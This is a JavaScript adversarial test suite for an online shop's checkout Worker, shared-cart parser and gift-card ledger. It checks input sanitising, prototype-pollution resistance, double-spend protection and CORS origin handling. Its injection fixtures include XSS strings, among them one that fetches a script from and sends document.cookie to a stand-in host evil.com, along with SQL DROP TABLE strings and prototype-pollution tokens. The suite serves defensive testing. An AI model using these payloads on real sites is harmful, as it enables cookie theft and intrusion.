/**
 * @fileoverview Empirical Challenger Adversarial Fuzzing & Stress Test Suite
 * for Milestone 1 implementations (Gifting, Share Cart URL, Loyalty Wallet).
 *
 * Run: node scripts/m1-adversarial-challenger.test.js
 */

const assert = require("assert");
const cart = require("../assets/js/cart.js");
const checkoutModule = require("../workers/checkout.js");
const checkoutWorker = checkoutModule.default || checkoutModule;
const catalogData = require("../assets/data/products.json");
const { makeNamespace } = require("./lib/d1-emulator.js");

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function runTest(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ✗ ${name}`);
    console.error(`    ${err.message}`);
  }
}

async function runAsyncTest(name, fn) {
  totalTests++;
  try {
    await fn();
    passedTests++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ✗ ${name}`);
    console.error(`    ${err.message}`);
  }
}

// Mock worker checkout execution harness
/* A Worker env carrying a real GiftCardLedger over an in-memory Durable
   Object, pre-loaded with `cards` ({code: initialCents}). */
async function makeAdversarialEnv(cards) {
  const { GiftCardLedger, giftCardLedger } = await import("../workers/state/gift-card-ledger.js");
  const env = {
    STRIPE_SECRET_KEY: "sk_test_mock_adv_secret",
    SITE_ORIGIN: "https://yallternativeliving.com",
    STRIPE_TAX_ENABLED: "false",
    GIFT_CARD_LEDGER: makeNamespace(GiftCardLedger)
  };
  for (const [code, cents] of Object.entries(cards || {})) {
    await giftCardLedger(env, code).issue({ initialCents: cents, source: "test" });
  }
  return env;
}

async function executeWorkerCheckout(body, mockStripe = {}) {
  let capturedSessionParams = null;
  let capturedCouponParams = null;
  let promoCodeRequests = 0;
  if (!mockStripe.env) mockStripe.env = await makeAdversarialEnv(mockStripe.cards);

  const originalFetch = global.fetch;
  global.fetch = async (url, opts = {}) => {
    const u = String(url);
    if (u.includes("products.json")) {
      return {
        ok: true,
        clone: () => ({ body: null }),
        json: async () => catalogData
      };
    }
    if (u.includes("events.json")) {
      return {
        ok: true,
        clone: () => ({ body: null }),
        json: async () => ({
          upcoming: [
            {
              id: "landrum-market",
              name: "Landrum Farmers Market",
              address: "221 W Rutherford St, Landrum, SC 29356",
              zip: "29356"
            }
          ],
          past: []
        })
      };
    }
    if (u.includes("/v1/tax/settings")) {
      return { ok: true, json: async () => ({ status: "inactive" }) };
    }
    if (u.includes("/v1/promotion_codes")) {
      // Counted, never answered. A gift card is a ledger balance now; the
      // Worker asking Stripe for one would mean it was reading a number
      // nothing maintains. Several assertions below pin this at zero.
      promoCodeRequests++;
      return { ok: true, json: async () => ({ data: [] }) };
    }
    if (u.includes("/v1/coupons")) {
      capturedCouponParams = new URLSearchParams(opts.body);
      return {
        ok: true,
        json: async () => ({
          id: "coup_test_ephemeral_adversarial",
          amount_off: capturedCouponParams.get("amount_off")
        })
      };
    }
    if (u.includes("/v1/checkout/sessions")) {
      capturedSessionParams = new URLSearchParams(opts.body);
      return {
        ok: true,
        json: async () => ({
          id: "cs_test_session_adv_123",
          url: "https://checkout.stripe.com/c/test_session_adv"
        })
      };
    }
    return { ok: true, json: async () => ({}) };
  };

  try {
    const req = new Request("https://yallternativeliving.com/api/checkout", {
      method: "POST",
      headers: {
        Origin: "https://yallternativeliving.com",
        "Content-Type": "application/json"
      },
      body: JSON.stringify(body)
    });

    const res = await checkoutWorker.fetch(req, mockStripe.env, { waitUntil: () => {} });
    const resJson = await res.json();
    return {
      status: res.status,
      body: resJson,
      sessionParams: capturedSessionParams,
      couponParams: capturedCouponParams,
      promoCodeRequests: promoCodeRequests
    };
  } finally {
    global.fetch = originalFetch;
  }
}

async function runMilestone1AdversarialSuite() {
  console.log("\n==================================================");
  console.log("MILESTONE 1 ADVERSARIAL CHALLENGER TEST SUITE");
  console.log("==================================================\n");

  /* ==========================================================================
     DIMENSION 1: Gifting Payload Parsing, Overflowing Notes, Malicious
                  Unicode/Control Characters, XSS & Injection Attacks
     ========================================================================== */
  console.log("--- DIMENSION 1: Gifting Fuzzing & Injection Stress ---");

  // 1.1: Exact length boundary checks (499, 500, 501, 20,000 chars)
  runTest("1.1.1: toCheckoutPayload handles exact boundary lengths (499, 500, 501)", () => {
    const note499 = "x".repeat(499);
    const note500 = "x".repeat(500);
    const note501 = "x".repeat(501);

    const p499 = cart.toCheckoutPayload(
      [{ id: "lavender-soak", qty: 1 }],
      null,
      null,
      true,
      note499
    );
    const p500 = cart.toCheckoutPayload(
      [{ id: "lavender-soak", qty: 1 }],
      null,
      null,
      true,
      note500
    );
    const p501 = cart.toCheckoutPayload(
      [{ id: "lavender-soak", qty: 1 }],
      null,
      null,
      true,
      note501
    );

    assert.strictEqual(p499.giftMessage.length, 499);
    assert.strictEqual(p500.giftMessage.length, 500);
    assert.strictEqual(p501.giftMessage.length, 500);
    assert.strictEqual(p501.gift_message.length, 500);
  });

  runTest(
    "1.1.2: toCheckoutPayload handles massive 20,000 char note overflow without memory exhaustion",
    () => {
      const massive = "A".repeat(20000);
      const payload = cart.toCheckoutPayload(
        [{ id: "lavender-soak", qty: 1 }],
        null,
        null,
        true,
        massive
      );
      assert.strictEqual(payload.giftMessage.length, 500);
      assert.strictEqual(payload.gift_message.length, 500);
    }
  );

  await runAsyncTest(
    "1.1.3: Worker checkout clamps overflowing gift message to 500 characters",
    async () => {
      const overflowNote = "Y'allternative Living Gift Note ".repeat(30); // ~960 chars
      const res = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        is_gift_order: true,
        gift_message: overflowNote
      });

      assert.strictEqual(res.status, 200);
      const savedMsg = res.sessionParams.get("metadata[gift_message]");
      assert.ok(savedMsg.length <= 500);
      assert.strictEqual(savedMsg.length, 500);
    }
  );

  // 1.2: Malicious Unicode, Zero-Width, RTL Overrides & Control Chars
  await runAsyncTest(
    "1.2.1: Worker checkout strips non-printable ASCII and control characters",
    async () => {
      let dirty = "Start-";
      for (let c = 0; c <= 0x1f; c++) {
        if (c !== 0x09 && c !== 0x0a && c !== 0x0d) {
          dirty += String.fromCharCode(c);
        }
      }
      dirty += "\x7F-End";

      const res = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        is_gift_order: true,
        gift_message: dirty
      });

      assert.strictEqual(res.status, 200);
      const cleanMsg = res.sessionParams.get("metadata[gift_message]");
      assert.strictEqual(cleanMsg, "Start--End");
      // eslint-disable-next-line no-control-regex
      assert.strictEqual(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(cleanMsg), false);
    }
  );

  await runAsyncTest(
    "1.2.2: Worker checkout preserves valid multiline text and international unicode",
    async () => {
      const unicodeNote =
        "Happy Birthday! 🎁✨\nمرحبا بكم · こんにちは · Привет · Southern Charm!\r\nFrom Landrum, SC.";
      const res = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        is_gift_order: true,
        gift_message: unicodeNote
      });

      assert.strictEqual(res.status, 200);
      const savedMsg = res.sessionParams.get("metadata[gift_message]");
      assert.ok(savedMsg.includes("🎁✨"));
      assert.ok(savedMsg.includes("مرحبا"));
      assert.ok(savedMsg.includes("こんにちは"));
      assert.ok(savedMsg.includes("Привет"));
      assert.ok(savedMsg.includes("\n"));
    }
  );

  // 1.3: XSS & Injection Vectors
  await runAsyncTest(
    "1.3.1: Worker checkout handles intense XSS / Script Injection vectors safely",
    async () => {
      const maliciousPayloads = [
        "<script>alert(document.cookie)</script>",
        "</textarea><script src='https://evil.com/xss.js'></script>",
        '"><img src=x onerror=alert(1)>',
        "<svg/onload=fetch('//evil.com/'+document.cookie)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1+(alert)(1)//'>",
        "{{constructor.constructor('alert(1)')()}}",
        "${7*7}",
        "'; DROP TABLE checkout_sessions; --",
        '"}],"injected":true,"items":[{'
      ];

      for (const payload of maliciousPayloads) {
        const res = await executeWorkerCheckout({
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          is_gift_order: true,
          gift_message: payload
        });

        assert.strictEqual(res.status, 200);
        assert.strictEqual(res.sessionParams.get("metadata[is_gift_order]"), "true");
        assert.strictEqual(
          res.sessionParams.get("metadata[gift_message]"),
          payload.trim().slice(0, 500)
        );
      }
    }
  );

  // 1.4: Type Fuzzing & Malformed Gifting Inputs
  runTest(
    "1.4.1: toCheckoutPayload handles abnormal type values for gift parameters without throwing",
    () => {
      const badTypes = [
        null,
        undefined,
        12345,
        true,
        false,
        { text: "evil" },
        ["gift note array"],
        NaN,
        Infinity,
        () => {}
      ];

      for (const bad of badTypes) {
        assert.doesNotThrow(() => {
          cart.toCheckoutPayload([{ id: "lavender-soak", qty: 1 }], null, null, true, bad);
        });
        assert.doesNotThrow(() => {
          cart.toCheckoutPayload([{ id: "lavender-soak", qty: 1 }], null, null, bad, "note");
        });
      }
    }
  );

  await runAsyncTest(
    "1.4.2: Worker checkout handles non-string gift_message and boolean variations safely",
    async () => {
      const weirdPayloads = [
        { is_gift_order: true, gift_message: 123456 },
        { is_gift_order: true, gift_message: { object: "message" } },
        { is_gift_order: true, gift_message: ["array", "message"] },
        { is_gift_order: true, gift_message: null },
        { is_gift_order: "true", gift_message: "String boolean flag" },
        { isGiftOrder: "true", giftMessage: "camelCase string boolean" },
        { is_gift_order: "false", gift_message: "Should be ignored" },
        { is_gift_order: 0, gift_message: "Should be ignored" }
      ];

      for (const body of weirdPayloads) {
        const res = await executeWorkerCheckout({
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          ...body
        });
        assert.strictEqual(
          res.status,
          200,
          `Worker checkout should succeed for ${JSON.stringify(body)}`
        );
        if (body.is_gift_order === "false" || body.is_gift_order === 0) {
          assert.strictEqual(res.sessionParams.get("metadata[is_gift_order]"), null);
        } else {
          assert.strictEqual(res.sessionParams.get("metadata[is_gift_order]"), "true");
        }
      }
    }
  );

  /* ==========================================================================
     DIMENSION 2: Share Cart URL Decoding Fuzzing, Prototype Pollution,
                  Corrupt Tokens, and Negative/NaN/Infinity Quantities
     ========================================================================== */
  console.log("\n--- DIMENSION 2: Share Cart URL Decoding Fuzzing ---");

  // 2.1: Non-string and corrupt input types
  runTest(
    "2.1.1: parseSharedCartParam handles all non-string and corrupted types without crashing",
    () => {
      const corruptedTypes = [
        null,
        undefined,
        12345,
        0,
        -1,
        true,
        false,
        NaN,
        Infinity,
        {},
        { cart: "frankincense-salve:1" },
        [],
        ["frankincense-salve:1"],
        Symbol("cart"),
        () => "frankincense-salve:1"
      ];

      for (const input of corruptedTypes) {
        const result = cart.parseSharedCartParam(input, catalogData);
        assert.ok(Array.isArray(result), `Expected array for input ${typeof input}`);
        assert.strictEqual(result.length, 0);
      }
    }
  );

  // 2.2: Negative, zero, NaN, infinite, float quantities
  runTest("2.2.1: parseSharedCartParam fuzzing on weird quantity tokens", () => {
    const testCases = [
      { token: "frankincense-salve:-10", expectedQty: 1, desc: "negative quantity clamped to 1" },
      {
        token: "frankincense-salve:-999999",
        expectedQty: 1,
        desc: "extreme negative clamped to 1"
      },
      { token: "frankincense-salve:0", expectedQty: 1, desc: "zero quantity clamped to 1" },
      { token: "frankincense-salve:000", expectedQty: 1, desc: "multiple zero clamped to 1" },
      { token: "frankincense-salve:NaN", expectedQty: 1, desc: "NaN quantity clamped to 1" },
      { token: "frankincense-salve:null", expectedQty: 1, desc: "null quantity clamped to 1" },
      {
        token: "frankincense-salve:undefined",
        expectedQty: 1,
        desc: "undefined quantity clamped to 1"
      },
      {
        token: "frankincense-salve:Infinity",
        expectedQty: 1,
        desc: "Infinity string non-numeric fallback to 1"
      },
      {
        token: "frankincense-salve:999999",
        expectedQty: 99,
        desc: "Huge integer clamped to default MAX_QTY ceiling (99)"
      },
      { token: "frankincense-salve:-Infinity", expectedQty: 1, desc: "-Infinity clamped to 1" },
      {
        token: "frankincense-salve:2.999",
        expectedQty: 2,
        desc: "Float quantity integer truncated to 2"
      },
      { token: "frankincense-salve:0.5", expectedQty: 1, desc: "Sub-1 float clamped to 1" },
      {
        token: "frankincense-salve:1e5",
        expectedQty: 1,
        desc: "Scientific notation integer parses 1"
      }
    ];

    for (const tc of testCases) {
      const res = cart.parseSharedCartParam(tc.token, catalogData);
      assert.strictEqual(res.length, 1, `Failed to parse token: ${tc.token}`);
      assert.strictEqual(res[0].qty, tc.expectedQty, `Failed ${tc.desc}: got ${res[0].qty}`);
    }

    // Specific stock ceiling test with custom mock catalog (stock: 5)
    const mockStockCat = {
      products: [{ id: "capped-salve", name: "Capped Salve", price: 10, stock: 5 }]
    };
    const cappedRes = cart.parseSharedCartParam("capped-salve:999", mockStockCat);
    assert.strictEqual(
      cappedRes[0].qty,
      5,
      "parseSharedCartParam clamps quantity to specific stock limit"
    );
  });

  // 2.3: Prototype Pollution Injection Attacks
  runTest("2.3.1: parseSharedCartParam is impervious to Prototype Pollution attacks", () => {
    // Ensure clean prototype baseline
    assert.strictEqual(Object.prototype.hasOwnProperty.call(Object.prototype, "polluted"), false);
    assert.strictEqual(Object.prototype.hasOwnProperty.call(Object.prototype, "isAdmin"), false);

    const pollutionPayloads = [
      "__proto__:1:polluted",
      "constructor:1:polluted",
      "prototype:1:polluted",
      "toString:1:polluted",
      "valueOf:1:polluted",
      "hasOwnProperty:1:polluted",
      "__proto__.polluted:1",
      "constructor.prototype.isAdmin:1",
      "frankincense-salve:1:__proto__",
      "frankincense-salve:1:constructor",
      "frankincense-salve:1:prototype"
    ];

    for (const payload of pollutionPayloads) {
      const res = cart.parseSharedCartParam(payload, catalogData);
      assert.ok(Array.isArray(res));
    }

    // Verify Object.prototype was NOT polluted
    assert.strictEqual(
      Object.prototype.hasOwnProperty.call(Object.prototype, "polluted"),
      false,
      "Object.prototype.polluted must not exist"
    );
    assert.strictEqual(
      Object.prototype.hasOwnProperty.call(Object.prototype, "isAdmin"),
      false,
      "Object.prototype.isAdmin must not exist"
    );
    assert.strictEqual({}.polluted, undefined);
    assert.strictEqual({}.isAdmin, undefined);
  });

  // 2.4: Malformed string tokens, nested delimiters, and DoS resilience
  runTest("2.4.1: parseSharedCartParam handles deeply nested colons and commas safely", () => {
    const deepDelimiters =
      "frankincense-salve:1:opt1:opt2:opt3:opt4:opt5,lavender-soak:2:::::,:::,,:::,";
    const res = cart.parseSharedCartParam(deepDelimiters, catalogData);
    assert.strictEqual(res.length, 2);
    assert.strictEqual(res[0].id, "frankincense-salve");
    assert.strictEqual(res[0].variantLabel, "opt1:opt2:opt3:opt4:opt5");
    assert.strictEqual(res[1].id, "lavender-soak");
    assert.strictEqual(res[1].variantLabel, "::::");
  });

  runTest(
    "2.4.2: parseSharedCartParam parses 5,000 tokens within 50ms (DoS / ReDoS Resistance)",
    () => {
      const tokens = [];
      for (let i = 0; i < 2500; i++) {
        tokens.push("frankincense-salve:1:2oz");
        tokens.push("lavender-soak:2");
      }
      const hugeCartStr = tokens.join(",");

      const start = Date.now();
      const res = cart.parseSharedCartParam(hugeCartStr, catalogData);
      const duration = Date.now() - start;

      assert.strictEqual(res.length, 5000);
      assert.ok(duration < 100, `Large cart parsing took ${duration}ms, expected < 100ms`);
    }
  );

  /* ==========================================================================
     DIMENSION 3: Loyalty Wallet Math, Concurrency, Fractional Points,
                  Voucher Randomness & Carryover Math
     ========================================================================== */
  console.log("\n--- DIMENSION 3: Loyalty Wallet Math & Concurrency ---");

  // 3.1: Wallet storage edge cases & negative balances
  runTest(
    "3.1.1: getWalletPoints and setWalletPoints handle negative, float, and corrupted storage",
    () => {
      const mockStorage = new Map();
      global.localStorage = {
        getItem: (k) => mockStorage.get(k) || null,
        setItem: (k, v) => mockStorage.set(k, String(v)),
        removeItem: (k) => mockStorage.delete(k),
        clear: () => mockStorage.clear()
      };

      // Test negative clamping
      cart.setWalletPoints(-500);
      assert.strictEqual(cart.getWalletPoints(), 0, "Negative points clamped to 0");

      cart.setWalletPoints(-0.01);
      assert.strictEqual(cart.getWalletPoints(), 0, "Sub-zero float points clamped to 0");

      cart.setWalletPoints(-Infinity);
      assert.strictEqual(cart.getWalletPoints(), 0, "-Infinity points clamped to 0");

      // Test float handling (integer conversion)
      cart.setWalletPoints(150.85);
      assert.strictEqual(cart.getWalletPoints(), 150, "Float points converted to integer");

      // Test string non-numeric handling
      cart.setWalletPoints("invalid_pts");
      assert.strictEqual(cart.getWalletPoints(), 0, "String garbage clamped to 0");

      // Test corrupted direct storage entries
      mockStorage.set("yl_loyalty_points", "-9999");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted negative direct storage returns 0");

      mockStorage.set("yl_loyalty_points", "NaN");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted NaN direct storage returns 0");

      mockStorage.set("yl_loyalty_points", "Infinity");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted Infinity direct storage returns 0");

      mockStorage.set("yl_loyalty_points", "{points:100}");
      assert.strictEqual(cart.getWalletPoints(), 0, "Corrupted JSON direct storage returns 0");
    }
  );

  // 3.2: Gift-card code generation -- collisions, charset, and the modulo bias
  // the audit flagged in the old 8-character derivation.
  await runAsyncTest(
    "3.2.1: randomGiftCardCode generates 1,000 unique codes with 0 collisions and an unambiguous charset",
    async () => {
      const { randomGiftCardCode, CODE_ALPHABET } = await import("../workers/routes/gift-cards.js");
      const generated = new Set();
      const codeFormat = /^YALL-[0-9A-Z]{4}-[0-9A-Z]{4}-[0-9A-Z]{4}$/;

      for (let i = 0; i < 1000; i++) {
        const code = randomGiftCardCode();
        assert.strictEqual(
          codeFormat.test(code),
          true,
          `Code ${code} must match the YALL-XXXX-XXXX-XXXX format`
        );
        // No visually ambiguous characters: I/L/O/U are not in the alphabet, so
        // a code read off a printed email cannot be retyped as a different one.
        assert.strictEqual(
          /[ILOU]/.test(code.slice(5)),
          false,
          `Code ${code} must not contain I, L, O or U`
        );
        assert.strictEqual(
          generated.has(code),
          false,
          `Collision detected on iteration ${i}: ${code}`
        );
        generated.add(code);
      }
      assert.strictEqual(generated.size, 1000, "1,000 generated codes must all be distinct");
      assert.strictEqual(
        CODE_ALPHABET.length,
        32,
        "the alphabet divides 256, so no byte folds unevenly"
      );
      assert.strictEqual(
        new Set(CODE_ALPHABET).size,
        32,
        "no symbol appears twice, which would double its probability"
      );
    }
  );

  // 3.3: Voucher Tampering and Format Filtering in Worker
  await runAsyncTest(
    "3.3.1: Worker checkout rejects tampered or malicious codes without minting anything",
    async () => {
      const invalidCodes = [
        "YALL-",
        "YALL-123",
        "YALL-PTS-",
        "YALL-PTS-123", // too short (< 6 suffix chars)
        "YALL-PTS-12345678901234567", // > 16 suffix chars
        "'; DROP TABLE coupons; --",
        "__proto__",
        "constructor",
        "<script>alert(1)</script>",
        "DISCOUNT50",
        "yall-pts-lowercase-invalid"
      ];

      for (const code of invalidCodes) {
        const res = await executeWorkerCheckout({
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          gift_card_code: code
        });
        // A malformed code is now a refusal the shopper can act on, rather than
        // a silent fall-through: someone who typed a code and watched the total
        // stay the same has been told nothing.
        assert.strictEqual(res.status, 400, `Invalid code "${code}" is refused`);
        assert.strictEqual(
          res.promoCodeRequests,
          0,
          `Invalid code "${code}" must never reach the Stripe API`
        );
        assert.strictEqual(
          res.couponParams,
          null,
          `Invalid code "${code}" must not generate an ephemeral coupon`
        );
      }

      // A well-formed code for a card that does not exist is refused just as
      // firmly, and just as cheaply.
      const ghost = await executeWorkerCheckout({
        items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
        gift_card_code: "YALL-GHOS-TGHO-STGH"
      });
      assert.strictEqual(ghost.status, 400, "A well-formed code for no card is refused");
      assert.strictEqual(ghost.couponParams, null, "...and mints no coupon");
    }
  );

  // 3.4: Balance Carryover Math Stress
  await runAsyncTest(
    "3.4.1: Worker caps the discount at the order total and holds exactly that on the ledger",
    async () => {
      // Lavender soak in products.json is $10.00 + $10 shipping = $20.00 total.
      // The card carries $100.00 (10000 cents).
      const env = await makeAdversarialEnv({ "YALL-BIG1-0000-0000": 10000 });
      const res = await executeWorkerCheckout(
        {
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          gift_card_code: "YALL-BIG1-0000-0000"
        },
        { env }
      );

      assert.strictEqual(res.status, 200);
      assert.strictEqual(res.promoCodeRequests, 0, "no Stripe promotion-code lookup happens");
      assert.strictEqual(
        res.couponParams.get("amount_off"),
        "2000",
        "Discount capped at $20.00 order total"
      );
      assert.strictEqual(
        res.sessionParams.get("metadata[gift_card_original_balance_cents]"),
        "10000",
        "Original $100 balance preserved"
      );
      assert.strictEqual(
        res.sessionParams.get("metadata[gift_card_amount_applied_cents]"),
        "2000",
        "Applied amount recorded as 2000 cents"
      );
      assert.strictEqual(
        res.sessionParams.get("metadata[gift_card_redeemed_code]"),
        "YALL-BIG1-0000-0000"
      );

      const { giftCardLedger } = await import("../workers/state/gift-card-ledger.js");
      const after = await giftCardLedger(env, "YALL-BIG1-0000-0000").getBalance();
      assert.strictEqual(after.pendingCents, 2000, "exactly the applied amount is held");
      assert.strictEqual(after.balanceCents, 8000, "the carryover is still spendable");
    }
  );

  // 3.4.2: The double-spend the audit found (C-2). Two checkouts against one
  // card cannot both get the money -- the ledger serialises them and the loser
  // is refused rather than silently discounted.
  await runAsyncTest(
    "3.4.2: two concurrent checkouts on one card cannot both spend it",
    async () => {
      const env = await makeAdversarialEnv({ "YALL-ONCE-ONCE-ONCE": 2000 });
      const first = await executeWorkerCheckout(
        {
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          gift_card_code: "YALL-ONCE-ONCE-ONCE"
        },
        { env }
      );
      assert.strictEqual(first.status, 200, "the first checkout gets the balance");

      const second = await executeWorkerCheckout(
        {
          items: [{ id: "lavender-soak", qty: 1, variant: "10 oz" }],
          gift_card_code: "YALL-ONCE-ONCE-ONCE"
        },
        { env }
      );
      assert.strictEqual(second.status, 400, "the second is refused: nothing spendable is left");

      const { giftCardLedger } = await import("../workers/state/gift-card-ledger.js");
      const after = await giftCardLedger(env, "YALL-ONCE-ONCE-ONCE").getBalance();
      assert.strictEqual(after.pendingCents, 2000, "only one hold exists");
      assert.strictEqual(after.balanceCents, 0, "and the card was debited exactly once");
    }
  );

  /* 3.5: Alt-Points redemption is GONE, not merely disabled (C-1). The old
     netlify/functions/redeem-points.js minted real, cash-like store credit on
     an unauthenticated caller's say-so -- a loop of POSTs was unlimited free
     money -- and was later stubbed to answer 410. The file is now deleted, so
     what has to be true is that nothing in the Worker answers for it and the
     path is 410 at the edge (asserted against the generated netlify.toml in
     scripts/worker-state.test.js). Here: the Worker must not route it. */
  await runAsyncTest("3.5.1: the Worker has no points-redemption route at all", async () => {
    const env = await makeAdversarialEnv();
    for (const path of ["/api/redeem-points", "/redeem-points", "/api/points"]) {
      const res = await checkoutWorker.fetch(
        new Request(`https://yallternativeliving.com${path}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Origin: "https://yallternativeliving.com"
          },
          body: JSON.stringify({ points: 500, email: "shopper@example.com" })
        }),
        env,
        { waitUntil: () => {} }
      );
      assert.strictEqual(res.status, 404, `${path} must not be a route`);
      assert.strictEqual(res.headers.get("Cache-Control"), "no-store");
      // CORS is an allowlist, never a reflection of the caller's Origin.
      assert.strictEqual(
        res.headers.get("Access-Control-Allow-Origin"),
        "https://yallternativeliving.com"
      );
      assert.strictEqual(res.headers.get("Vary"), "Origin");
    }

    const hostile = await checkoutWorker.fetch(
      new Request("https://yallternativeliving.com/api/gift-card-balance", {
        method: "POST",
        headers: { "Content-Type": "application/json", Origin: "https://attacker.example" },
        body: "{}"
      }),
      env,
      { waitUntil: () => {} }
    );
    assert.strictEqual(hostile.status, 403);
    assert.strictEqual(
      hostile.headers.get("Access-Control-Allow-Origin"),
      "https://yallternativeliving.com",
      "a hostile Origin is never echoed back"
    );

    const allowed = await checkoutWorker.fetch(
      new Request("https://yallternativeliving.com/api/restock", {
        method: "OPTIONS",
        headers: { Origin: "https://www.yallternativeliving.com" }
      }),
      env,
      { waitUntil: () => {} }
    );
    assert.strictEqual(
      allowed.headers.get("Access-Control-Allow-Origin"),
      "https://www.yallternativeliving.com",
      "the www host is on the allowlist"
    );
  });

  // 3.6: the balance route's input handling (ported from the retired
  // netlify/functions/gift-card-balance.js cases).
  await runAsyncTest(
    "3.6.1: /api/gift-card-balance handles empty, null and malformed codes",
    async () => {
      const { GiftCardLedger } = await import("../workers/state/gift-card-ledger.js");
      const { RateLimitCounter } = await import("../workers/state/rate-limit.js");
      const env = {
        SITE_ORIGIN: "https://yallternativeliving.com",
        STRIPE_SECRET_KEY: "sk_test_mock_adv_secret",
        GIFT_CARD_LEDGER: makeNamespace(GiftCardLedger),
        RATE_LIMIT_COUNTER: makeNamespace(RateLimitCounter)
      };
      const ask = async (payload) => {
        const res = await checkoutWorker.fetch(
          new Request("https://yallternativeliving.com/api/gift-card-balance", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Origin: "https://yallternativeliving.com"
            },
            body: payload
          }),
          env,
          { waitUntil: () => {} }
        );
        return { status: res.status, body: await res.json() };
      };

      const resEmpty = await ask(JSON.stringify({ code: "" }));
      assert.strictEqual(resEmpty.body.valid, false);

      const resNull = await ask(JSON.stringify({ code: null }));
      assert.strictEqual(resNull.body.valid, false);

      const resMissing = await ask(JSON.stringify({}));
      assert.strictEqual(resMissing.body.valid, false);

      const resBadFormat = await ask(JSON.stringify({ code: "NOT-A-REAL-FORMAT" }));
      assert.strictEqual(resBadFormat.body.valid, false);
      assert.ok(resBadFormat.body.error.includes("Invalid code format"));

      const resObject = await ask(JSON.stringify({ code: { toString: "nope" } }));
      assert.strictEqual(resObject.body.valid, false, "a non-string code is refused, not coerced");

      const resGarbage = await ask("{not json");
      assert.strictEqual(resGarbage.status, 400, "an unparseable body is a 400, not a crash");
    }
  );

  console.log("\n==================================================");
  console.log(`MILESTONE 1 ADVERSARIAL TESTS COMPLETED:`);
  console.log(`Passed: ${passedTests}/${totalTests}`);
  console.log(`Failed: ${failedTests}/${totalTests}`);
  console.log("==================================================\n");

  if (failedTests > 0) {
    process.exit(1);
  }
}

runMilestone1AdversarialSuite().catch((err) => {
  console.error("FATAL RUNNER FAILURE:", err);
  process.exit(1);
});
